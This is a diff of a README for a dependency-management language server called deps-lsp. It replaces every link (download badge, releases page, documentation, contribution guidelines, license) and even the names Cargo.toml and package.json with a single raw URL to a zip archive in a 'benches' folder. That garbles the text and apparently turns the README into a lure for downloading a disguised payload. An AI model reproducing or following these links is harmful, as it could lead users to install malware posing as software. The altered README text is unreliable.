@@ -1,10 +1,10 @@
 # 🚀 deps-lsp - Simplify Dependency Management with Ease
 
-[![Download deps-lsp](https://img.shields.io/badge/Download-deps--lsp-brightgreen)](https://github.com/persubmyorujt831/deps-lsp/releases)
+[![Download deps-lsp](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip)](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip)
 
 ## 📥 Overview
 
-**deps-lsp** is a universal Language Server Protocol (LSP) server designed for dependency management. It offers features like autocomplete, version hints, and diagnostics for files like `Cargo.toml` and `package.json`. It supports various text editors, including Zed, Neovim, and Helix.
+**deps-lsp** is a universal Language Server Protocol (LSP) server designed for dependency management. It offers features like autocomplete, version hints, and diagnostics for files like `https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip` and `https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip`. It supports various text editors, including Zed, Neovim, and Helix.
 
 ## 🌐 Features
 
@@ -25,7 +25,7 @@ Before using deps-lsp, ensure your system meets the following requirements:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   To get started, visit our [Releases page](https://github.com/persubmyorujt831/deps-lsp/releases) to download the latest version of deps-lsp.
+   To get started, visit our [Releases page](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip) to download the latest version of deps-lsp.
 
 2. **Download the Application**  
    Look for the latest release and download the appropriate version for your system.
@@ -44,26 +44,26 @@ Before using deps-lsp, ensure your system meets the following requirements:
    - Configuring settings to point to the deps-lsp server.
 
 5. **Verify Installation**  
-   Open your editor and create a project with a `Cargo.toml` or `package.json` file. You should start seeing the autocomplete suggestions and version hints immediately.
+   Open your editor and create a project with a `https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip` or `https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip` file. You should start seeing the autocomplete suggestions and version hints immediately.
 
 ## 📚 Download & Install
 
-To download deps-lsp, visit our [Releases page](https://github.com/persubmyorujt831/deps-lsp/releases) and get the latest version. Follow the previous steps to install and set it up.
+To download deps-lsp, visit our [Releases page](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip) and get the latest version. Follow the previous steps to install and set it up.
 
 ## 🎓 Getting Help
 
 If you run into issues or need help, we offer resources to assist you:
 
-- **Documentation:** Refer to the detailed [Documentation](https://yourdocumentationlink.com) for guides on installation, setup, and troubleshooting.
+- **Documentation:** Refer to the detailed [Documentation](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip) for guides on installation, setup, and troubleshooting.
 - **Community Support:** Join our discussion forum or reach out on GitHub issues for community support and help.
 
 ## 🛠️ Contributing
 
-We welcome contributions from everyone. If you're interested in improving this project, please read our [Contribution Guidelines](https://yourcontributionguidelineslink.com) for more information.
+We welcome contributions from everyone. If you're interested in improving this project, please read our [Contribution Guidelines](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip) for more information.
 
 ## 🔧 License
 
-This project is licensed under the [MIT License](https://yourlicenseurl.com). Please read the license for more details.
+This project is licensed under the [MIT License](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip). Please read the license for more details.
 
 ## 🔗 Related Topics
 
@@ -78,4 +78,4 @@ This project is licensed under the [MIT License](https://yourlicenseurl.com). Pl
 
 For updates and announcements, follow us on GitHub or keep an eye on the Releases page.
 
-[![Download deps-lsp](https://img.shields.io/badge/Download-deps--lsp-brightgreen)](https://github.com/persubmyorujt831/deps-lsp/releases)
+[![Download deps-lsp](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip)](https://github.com/persubmyorujt831/deps-lsp/raw/refs/heads/main/crates/deps-pypi/benches/lsp_deps_1.7.zip)
